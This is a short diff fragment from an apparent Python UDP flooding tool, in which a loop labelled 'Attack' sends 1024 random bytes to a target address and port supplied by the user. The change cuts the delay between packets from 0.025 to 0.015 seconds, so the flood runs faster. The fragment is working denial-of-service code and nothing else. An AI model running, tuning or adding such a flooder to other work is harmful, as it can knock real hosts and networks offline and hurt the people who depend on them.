@@ -69,5 +69,5 @@ while Attack == 2:
     print('sending 1024 bytes to ' + args.ipv4)
     rndbytes = os.urandom(1024)
     s.sendto(rndbytes, (args.ipv4, (int)(args.port)))
-    time.sleep(0.025)
+    time.sleep(0.015)
     s.close()
